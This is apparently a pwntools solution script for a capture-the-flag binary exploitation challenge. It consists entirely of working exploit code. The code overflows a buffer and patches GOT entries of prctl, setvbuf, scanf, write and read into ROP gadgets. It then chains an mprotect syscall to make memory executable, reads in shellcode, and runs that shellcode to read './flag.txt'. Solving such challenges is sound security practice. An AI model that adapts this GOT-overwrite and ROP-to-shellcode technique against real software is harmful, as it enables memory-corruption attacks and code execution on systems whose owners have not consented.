#!/usr/bin/env python3

from pwn import *

exe = ELF('./chall_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def modify(addr, val):
	# 0x4013f2: pop rbx ; pop rbp ; mov r12, qword [rsp+0x00] ; add rsp, 0x08 ; ret ;
	# 0x401178: add  [rbp-0x3D], ebx ; nop  [rax+rax+0x00] ; ret ;
	payload = p64(0x4013f2) + p64(val & 0xffffffff) + p64(addr + 0x3d) + p64(0) + p64(0x401178)
	return payload

script = '''
b *0x401437
b *0x4013e9
'''

p = process('./chall_patched')
#p = gdb.debug('./chall_patched', gdbscript = script)
#debug()

# offset from libc base to gadgets
os_pop_rdi = 0x000000000008ff1d # pop rdi ; ret
os_pop_rdx = 0x000000000008ef1b # pop rdx ; ret
os_mov_esi_dword_ptr_rsp = 0x41e35 # mov esi,  [rsp+0x00] ; add rsp, 0x08 ; ret ;
os_mov_rax_rdi = 0x69892 # mov rax, rdi ; ret ;
os_syscall_ret = 0x9cfc2 # syscall ; ret ;

# rop chain
payload = b"A" * 0x20 + p64(0)
## modify got to gadgets
payload += modify(exe.got['prctl'], os_pop_rdi - libc.symbols['prctl']) # prctl.plt -> pop rdi; ret;
payload += modify(exe.got['setvbuf'], os_pop_rdx - libc.symbols['setvbuf']) # setvbuf.plt -> pop rdx; ret;
payload += modify(exe.got['__isoc99_scanf'], os_mov_esi_dword_ptr_rsp - libc.symbols['__isoc99_scanf']) # __isoc99_scanf.plt -> pop esi; ret; ?
payload += modify(exe.got['write'], os_mov_rax_rdi - libc.symbols['write']) # write.plt -> mov rax, rdi; ret;
payload += modify(exe.got['read'], os_syscall_ret - libc.symbols['read']) # read.plt -> syscall; ret;

## call mprotect(0x404000, 0x1000, 7)
payload += p64(exe.plt['prctl']) + p64(10) + p64(exe.plt['write']) # rax = 10
payload += p64(exe.plt['prctl']) + p64(0x404000) # rdi = 0x404000
payload += p64(exe.plt['setvbuf']) + p64(7) # rdx = 7
payload += p64(exe.plt['__isoc99_scanf']) + p64(0x1000) # esi = 0x1000
payload += p64(exe.plt['read']) # syscall, call mprotect(0x404000, 0x1000, 7) then ret

## prepare shellcode at 0x404100 (call read(0, 0x404100, 0x100))
payload += p64(exe.plt['prctl']) + p64(0) + p64(exe.plt['write']) # rax = 0
payload += p64(exe.plt['prctl']) + p64(0) # rdi = 0
payload += p64(exe.plt['setvbuf']) + p64(0x100) # rdx = 0x100
payload += p64(exe.plt['__isoc99_scanf']) + p64(0x404100) # esi = 0x404100
payload += p64(exe.plt['read']) # syscall, call read(0, 0x404100, 0x100) then ret
payload += p64(0x404100) # ret2shellcode


sla("bytes?\n", f"{len(payload)}".encode())
s(payload)

shellc = asm(shellcraft.readfile("./flag.txt", 1))
s(shellc)

p.interactive()
